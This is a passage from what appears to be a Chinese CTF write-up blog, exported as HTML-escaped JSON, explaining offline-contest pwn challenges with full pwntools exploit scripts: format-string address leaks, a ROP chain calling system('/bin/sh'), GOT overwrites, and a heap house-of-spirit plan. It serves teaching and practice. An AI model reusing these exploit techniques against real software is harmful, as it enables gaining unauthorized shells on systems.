p64(atoi_got)) # <span class=\"built_in\">index</span> <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\"># leak atoi_addr</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'is '</span>)</div><div class=\"line\">    atoi_addr = u64(<span class=\"keyword\">p</span>.recv(<span class=\"number\">6</span>) + <span class=\"string\">'\\x00\\x00'</span>)</div><div class=\"line\">#    gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvline()</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'atoi_addr =&gt; '</span>, hex(atoi_addr)</div><div class=\"line\"></div><div class=\"line\"># <span class=\"keyword\">edit</span> atoi <span class=\"keyword\">to</span> <span class=\"built_in\">system</span></div><div class=\"line\">    libc.address = atoi_addr - libc.symbols[<span class=\"string\">'atoi'</span>]</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, hex(system_addr)</div><div class=\"line\">    binsh_addr = libc.<span class=\"built_in\">search</span>(<span class=\"string\">'/bin/sh'</span>).<span class=\"keyword\">next</span>()</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(<span class=\"string\">'0'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(p64(system_addr))</div><div class=\"line\">#    gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\"></div><div class=\"line\"># getshell</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.send(<span class=\"string\">'/bin/sh\\x00'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.interactive()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>简单的一些线下赛的pwn题吧，可能因为线下赛时间短，所以题目没有特别变态的，简单记录，还是学到了不少东西的。</p>\n<h2 id=\"ropprintf\"><a href=\"#ropprintf\" class=\"headerlink\" title=\"ropprintf\"></a>ropprintf</h2><p>两个洞，栈溢出和fsb，稍加利用即可。这里主要是存在64位的问题，64位的的传参顺序是先用六个寄存器，然后才到栈上存数据。所以<code>%7$lx</code>才会打印出栈上的数据；同时<code>x</code>与<code>lx</code>的区别，分别是4byte与8byte长度。相同的还有<code>n</code>这个格式化符号，<code>n</code>是写到对应内存的4个byte里，<code>ln</code>是写到对应内存的8byte里。</p>\n<p>然后还要注意，不同机器上的libc可能不一样，同时大多数都是以<code>0</code>对齐的，所以可能需要猜一猜。</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env <span class=\"keyword\">python</span></div><div class=\"line\"># coding=utf-<span class=\"number\">8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">debug</span> = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slo<span class=\"variable\">g:</span> context(log_level = <span class=\"string\">'debug'</span>, terminal = [<span class=\"string\">'tmux'</span>, <span class=\"string\">'splitw'</span>, <span class=\"string\">'-h'</span>])</div><div class=\"line\"><span class=\"keyword\">if</span> loca<span class=\"variable\">l:</span></div><div class=\"line\">    <span class=\"keyword\">p</span> = process(<span class=\"string\">'./ropprintf'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    <span class=\"keyword\">p</span> = remote(<span class=\"string\">'172.16.1.1'</span>, <span class=\"number\">20000</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\">#if local <span class=\"built_in\">and</span> debu<span class=\"variable\">g:</span></div><div class=\"line\">#    gdb.attach(<span class=\"keyword\">p</span>, <span class=\"keyword\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./ropprintf'</span>)</div><div class=\"line\"></div><div class=\"line\">offset = <span class=\"number\">22</span></div><div class=\"line\"></div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</div><div class=\"line\"></div><div class=\"line\">payload1 = <span class=\"string\">'%11$lx'</span></div><div class=\"line\">pop_ret = <span class=\"number\">0</span>x0000000000400703 # <span class=\"keyword\">pop</span> rdi, <span class=\"keyword\">ret</span></div><div class=\"line\"><span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\"><span class=\"keyword\">p</span>.sendline(payload1)</div><div class=\"line\">libc_start_main_addr = <span class=\"keyword\">int</span>(<span class=\"keyword\">p</span>.recvline(), <span class=\"number\">16</span>)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'libc_start =&gt; '</span>, hex(libc_start_main_addr)</div><div class=\"line\"></div><div class=\"line\">libc.address = libc_start_main_addr - <span class=\"number\">240</span> - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</div><div class=\"line\">system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, hex(system_addr)</div><div class=\"line\">binsh_addr = libc.<span class=\"built_in\">search</span>(<span class=\"string\">'/bin/sh'</span>).<span class=\"keyword\">next</span>()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\"># gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\">payload2 = <span class=\"string\">'a'</span> * offset + p64(pop_ret) + p64(binsh_addr) + p64(system_addr)</div><div class=\"line\"><span class=\"keyword\">p</span>.sendline(payload2)</div><div class=\"line\"><span class=\"keyword\">p</span>.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"easyprintf\"><a href=\"#easyprintf\" class=\"headerlink\" title=\"easyprintf\"></a>easyprintf</h2><p>最直接的fsb。程序开了<code>PIE</code>，可以通过直接打印得到<code>elf.address</code>和<code>libc.address</code>。由于传参方式不一样，所以能用传统的方式去写，这里我是用的<code>UAF</code>，因为我们可以控制栈上的内容，所以可以提前将想要写入的地址布置在栈上，然后再用fsb的<code>hhn</code>和<code>hn</code>分字节去修改。</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">local</span> = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>, terminal = [<span class=\"string\">'tmux'</span>,<span class=\"string\">'splitw'</span>, <span class=\"string\">'-h'</span>])</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span>:</div><div class=\"line\">    p = process(<span class=\"string\">'./easyprintf'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p)</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./easyprintf'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># leak libc_base &amp; elf_base</span></div><div class=\"line\">payload1 = <span class=\"string\">'%9$lx-%38$lx'</span></div><div class=\"line\">p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></div><div class=\"line\">p.sendline(payload1)</div><div class=\"line\">addr = p.recvline()[:-<span class=\"number\">1</span>].<span class=\"keyword\">split</span>(<span class=\"string\">'-'</span>)</div><div class=\"line\">libc.address = <span class=\"keyword\">int</span>(addr[<span class=\"number\">0</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x18ba47</span></div><div class=\"line\">elf.address = <span class=\"keyword\">int</span>(addr[<span class=\"number\">1</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x8d0</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'elf_base =&gt; '</span>, <span class=\"keyword\">hex</span>(elf.address)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'libc_address =&gt; '</span>, <span class=\"keyword\">hex</span>(libc.address)</div><div class=\"line\">system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">binsh_addr = libc.search(<span class=\"string\">'/bin/sh'</span>).next()</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, <span class=\"keyword\">hex</span>(system_addr)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'binsh_addr =&gt; '</span>, <span class=\"keyword\">hex</span>(binsh_addr)</div><div class=\"line\">printf_addr = <span class=\"keyword\">hex</span>(libc.symbols[<span class=\"string\">'printf'</span>])</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'printf_addr =&gt; '</span>, printf_addr</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># UAF</span></div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'printf_got =&gt; '</span>, <span class=\"keyword\">hex</span>(printf_got)</div><div class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></div><div class=\"line\">payload2 = <span class=\"string\">'a'</span> * (<span class=\"number\">0x100</span> - <span class=\"number\">0x10</span>) + p64(printf_got + <span class=\"number\">0x2</span>)  + p64(printf_got)</div><div class=\"line\"><span class=\"keyword\">print</span> payload2</div><div class=\"line\">p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></div><div class=\"line\">p.sendline(payload2)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># edit printf_got to system_addr</span></div><div class=\"line\">offset = <span class=\"keyword\">int</span>(printf_addr[-<span class=\"number\">6</span>:-<span class=\"number\">4</span>], <span class=\"number\">16</span>) - <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"keyword\">hex</span>(offset)</div><div class=\"line\">offset1 = <span class=\"keyword\">int</span>(<span class=\"keyword\">hex</span>(system_addr - libc.address)[<span class=\"number\">4</span>:], <span class=\"number\">16</span>) + <span class=\"keyword\">int</span>(str(printf_addr)[-<span class=\"number\">4</span>] + <span class=\"string\">'000'</span>, <span class=\"number\">16</span>)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"keyword\">hex</span>(offset1)</div><div class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></div><div class=\"line\">payload3 = <span class=\"string\">'%&#123;&#125;x'</span>.format(offset) + <span class=\"string\">'%36$hhn'</span></div><div class=\"line\">payload3 += <span class=\"string\">'%&#123;&#125;x'</span>.format(offset1 - offset) + <span class=\"string\">'%37$hn'</span></div><div class=\"line\"><span class=\"comment\"># payload3 = '%37$lx'</span></div><div class=\"line\">p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">p.sendline(payload3)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># getshell</span></div><div class=\"line\">p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'/bin/sh\\x00'</span>)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"book\"><a href=\"#book\" class=\"headerlink\" title=\"book\"></a>book</h2><p>一个简单的堆的题目。由于程序在每次<code>add()</code>时候都会申请一个相应大小的<code>fastbin</code>和<code>smallbin</code>，释放时<code>fastbin</code>放到对应链表中，<code>smallbin</code>放到<code>unsortbin</code>链表中。其中<code>feedback()</code>没有检查堆的长度，修改可造成堆溢出。</p>\n<p><code>feedback()</code><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\">_<span class=\"function\">BYTE *<span class=\"title\">feedback</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  _BYTE *result; <span class=\"comment\">// rax@7</span></div><div class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [sp+8h] [bp-8h]@1</span></div><div class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [sp+Ch] [bp-4h]@1</span></div><div class=\"line\"></div><div class=\"line\">  v1 = <span class=\"number\">0</span>;</div><div class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)i &lt;= <span class=\"number\">3</span>; ++i )</div><div class=\"line\">  &#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> ( auther_name_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)i] &amp;&amp; feedback_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)i] )</div><div class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"feedback of book%d is %s\\n\"</span>, i, feedback_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)i]);</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Which book do you want to modify the feedback?\"</span>);</div><div class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</div><div class=\"line\">  result = (_BYTE *)v1;</div><div class=\"line\">  <span class=\"keyword\">if</span> ( (v1 &amp; <span class=\"number\">0x80000000</span>) == <span class=\"number\">0</span> )</div><div class=\"line\">  &#123;</div><div class=\"line\">    result = (_BYTE *)v1;</div><div class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v1 &lt;= <span class=\"number\">3</span> )</div><div class=\"line\">    &#123;</div><div class=\"line\">      result = (_BYTE *)feedback_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v1];</div><div class=\"line\">      <span class=\"keyword\">if</span> ( result )</div><div class=\"line\">        result = read_feadback(feedback_array[<span class=\"number\">5</span> * (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v1]);</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">return</span> result;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>这个函数不仅会造成堆溢出，还可用来泄露一些地址。<br>简单观察可以发现<code>fastbin</code>的链表可以通过堆溢出修改，也就是说我们可以使用<code>house_of_spirit</code>来分配得到一个指向bss段的chunk，然后修改<code>feedback_array[]</code>这个指针数组，并通过<code>feedback()</code>来泄露libc的地址。<br>但是还要找到一个bss上的<code>0x10,0x20,0x30...</code>的数字才能构造，事实上bss上存有<code>feedback_length[]</code>这个数组，我们可以通过<code>UAF</code>去得到一个数字即可。</p>\n<p><code>bss</code>段数据：<br><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00 _bss            segment para <span class=\"keyword\">public</span> <span class=\"string\">'BSS'</span> use64</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                 assume <span class=\"string\">cs:</span>_bss</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                 ;org <span class=\"number\">601</span>D00h</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                 assume <span class=\"string\">es:</span>nothing, <span class=\"string\">ss:</span>nothing, <span class=\"string\">ds:</span>_data, <span class=\"string\">fs:</span>nothing, <span class=\"string\">gs:</span>nothing</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                 <span class=\"keyword\">public</span> stdin</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00 ; FILE *stdin</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00 stdin           dq ?                    ; DATA XREF: main+<span class=\"number\">17</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D00                                         ; Copy of shared data</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D08                 align <span class=\"number\">10</span>h</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D10                 <span class=\"keyword\">public</span> stdout</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D10 ; FILE *stdout</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D10 stdout          dq ?                    ; DATA XREF: main+<span class=\"number\">35</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D10                                         ; Copy of shared data</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D18 byte_601D18     db ?                    ; DATA XREF: sub_400850+<span class=\"number\">9</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D18                                         ; <span class=\"string\">sub_400850:</span>loc_4008A6\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D19                 align <span class=\"number\">20</span>h</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D20 qword_601D20    dq ?                    ; DATA XREF: sub_400850+<span class=\"number\">17</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D20                                         ; sub_400850+<span class=\"number\">3</span>C\u0018w ...</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D28                 align <span class=\"number\">20</span>h</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D40 ; <span class=\"keyword\">int</span> dword_601D40[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D40 dword_601D40    dd ?                    ; DATA XREF: random+<span class=\"number\">115</span>\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D40                                         ; add+<span class=\"number\">71</span>\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D44                 align <span class=\"number\">8</span></div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D48 ; __int64 index_array[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D48 index_array     dq ?                    ; DATA XREF: add+<span class=\"number\">9</span>A\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D48                                         ; exchange+C5\u0018r ...</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D50 ; __int64 feedback_length[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D50 feedback_length dq ?                    ; DATA XREF: add+<span class=\"number\">19</span>F\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D50                                         ; sub_400F67+BB\u0018r ...</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D58 ; __int64 auther_name_array[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D58 auther_name_array dq ?                  ; DATA XREF: add+D9\u0018w</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D58                                         ; add+F7\u0018r ...</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D60 ; __int64 feedback_array[]</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D60 feedback_array  dq ?                    ; DATA XREF: random+F3\u0018r</div><div class=\"line\">.<span class=\"string\">bss:</span><span class=\"number\">0000000000601</span>D60                                         ; random+<span class=\"number\">235</span>\u0018r ...</div></pre></td></tr></table></figure></p>\n<p>所以我的思路如下：</p>\n<ol>\n<li>通过一定的堆排布，是的<code>fastbin</code>在地址上连续，使得堆溢出可以修改相邻堆块的指针。</li>\n<li>在堆排布的同时申请一个长度为<code>0x20</code>的feedback，使得<code>0x20</code>用来我们以后伪造<code>fastbin</code>并分配来用。</li>\n<li>通过堆溢出修改相邻已经<code>free</code>了的<code>fastbin</code>，修改指针使其指向我们刚才已经伪造的bss上的地址。</li>\n<li>修改<code>freeback_array[]</code>，使一个指针为<code>atoi_got</code>。</li>\n<li>再次使用<code>feedback()</code>泄露<code>atoi</code>，并计算libc得到<code>system</code>，并修改<code>atoi_got</code>为<code>system</code>。</li>\n<li>getshell</li>\n</ol>\n<p>exp：<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env <span class=\"keyword\">python</span></div><div class=\"line\"># coding=utf-<span class=\"number\">8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">debug</span> = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slo<span class=\"variable\">g:</span> context(log_level = <span class=\"string\">'debug'</span>)#, terminal = [<span class=\"string\">'tmux'</span>, <span class=\"string\">'splitw'</span>, <span class=\"string\">'-h'</span>])</div><div class=\"line\"><span class=\"keyword\">if</span> loca<span class=\"variable\">l:</span></div><div class=\"line\">    <span class=\"keyword\">p</span> = process(<span class=\"string\">'./book'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    <span class=\"keyword\">p</span> = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"built_in\">and</span> debu<span class=\"variable\">g:</span></div><div class=\"line\">    gdb.attach(<span class=\"keyword\">p</span>, <span class=\"keyword\">open</span>(<span 